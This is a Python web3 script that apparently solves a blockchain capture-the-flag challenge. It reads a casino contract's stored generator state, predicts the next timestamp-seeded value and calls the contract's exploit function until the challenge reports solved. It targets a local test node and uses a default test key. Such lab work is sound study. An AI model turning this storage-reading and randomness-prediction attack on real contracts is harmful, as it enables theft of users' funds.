import json
import os
import subprocess
from pathlib import Path

from web3 import Web3


RPC_URL = os.getenv("RPC_URL", "http://127.0.0.1:8545")
PRIVATE_KEY = os.getenv(
    "PRIVATE_KEY",
    "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80",
)
SETUP_ADDRESS = os.getenv("SETUP_ADDRESS")
PIN_TIMESTAMP = os.getenv("PIN_TIMESTAMP") == "1"
MAX_ATTEMPTS = int(os.getenv("MAX_ATTEMPTS", "5"))

P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
A = 0x514C4F4E474D55534B
C = 0x1337BEEF

w3 = Web3(Web3.HTTPProvider(RPC_URL))
PLAYER = w3.eth.account.from_key(PRIVATE_KEY).address


def load_artifact(path):
    artifact = json.loads(Path(path).read_text())
    return artifact["abi"], artifact["bytecode"]["object"]


def fill_tx(tx):
    tx["from"] = PLAYER
    tx["nonce"] = w3.eth.get_transaction_count(PLAYER)
    tx["gas"] = 5_000_000
    tx["chainId"] = w3.eth.chain_id
    tx.pop("gasPrice", None)

    latest_block = w3.eth.get_block("latest")
    base_fee = latest_block.get("baseFeePerGas", w3.to_wei(1, "gwei"))
    tx["maxPriorityFeePerGas"] = w3.to_wei(1, "gwei")
    tx["maxFeePerGas"] = base_fee * 2 + tx["maxPriorityFeePerGas"]

    return tx


def send_tx(tx):
    signed = w3.eth.account.sign_transaction(fill_tx(tx), PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    return w3.eth.wait_for_transaction_receipt(tx_hash)


def deploy(abi, bytecode, args=()):
    contract = w3.eth.contract(abi=abi, bytecode=bytecode)
    tx = contract.constructor(*args).build_transaction({"from": PLAYER, "gas": 5_000_000})
    receipt = send_tx(tx)
    if receipt.status != 1:
        raise RuntimeError("deployment reverted")
    return w3.eth.contract(address=receipt.contractAddress, abi=abi)


def build_contracts():
    subprocess.run(["forge", "build", "--root", "."], check=True)


def read_uint256_storage(address, slot):
    raw = w3.eth.get_storage_at(address, slot)
    return int.from_bytes(raw, "big")


def predict_next_state(current_state, timestamp):
    return (A * current_state + C + timestamp) % P


def maybe_pin_next_timestamp(timestamp):
    try:
        response = w3.provider.make_request("evm_setNextBlockTimestamp", [timestamp])
        return "error" not in response
    except Exception:
        return False


def main():
    if not w3.is_connected():
        raise SystemExit("[-] RPC is not connected. Start anvil or set RPC_URL.")

    print("[+] Player:", PLAYER)
    print("[+] Balance:", w3.from_wei(w3.eth.get_balance(PLAYER), "ether"), "ETH")
    print("[+] Chain ID:", w3.eth.chain_id)

    print("[*] Building contracts...")
    build_contracts()

    setup_abi, setup_bin = load_artifact("out/Setup.sol/Setup.json")
    casino_abi, _ = load_artifact("out/TimeVariantCasino.sol/TimeVariantCasino.json")

    if SETUP_ADDRESS:
        setup = w3.eth.contract(address=Web3.to_checksum_address(SETUP_ADDRESS), abi=setup_abi)
        print("[+] Setup:", setup.address)
    else:
        print("[*] Deploying Setup...")
        setup = deploy(setup_abi, setup_bin)
        print("[+] Setup:", setup.address)

    casino_addr = setup.functions.casino().call()
    casino = w3.eth.contract(address=casino_addr, abi=casino_abi)
    print("[+] Casino:", casino.address)

    solved = setup.functions.isSolved().call()
    for attempt in range(1, MAX_ATTEMPTS + 1):
        if solved:
            break

        current_state = read_uint256_storage(casino.address, 0)
        print("[+] Leaked state:", hex(current_state))

        latest_timestamp = w3.eth.get_block("latest").timestamp
        exploit_timestamp = latest_timestamp + 1 if PIN_TIMESTAMP else latest_timestamp
        exact_next_state = predict_next_state(current_state, exploit_timestamp)

        if PIN_TIMESTAMP and maybe_pin_next_timestamp(exploit_timestamp):
            print("[+] Pinned next block timestamp:", exploit_timestamp)
        else:
            print("[*] Predicting next block timestamp:", exploit_timestamp)

        print(f"[*] Calling exploit attempt {attempt}/{MAX_ATTEMPTS}...")
        tx = casino.functions.exploit(exact_next_state).build_transaction(
            {"from": PLAYER, "gas": 5_000_000}
        )
        receipt = send_tx(tx)
        print("[+] Attack tx:", receipt.transactionHash.hex())
        print("[+] Attack status:", receipt.status)

        solved = setup.functions.isSolved().call()
        print("[+] isSolved:", solved)

    print("[+] SOLVED" if solved else "[-] FAILED")


if __name__ == "__main__":
    main()
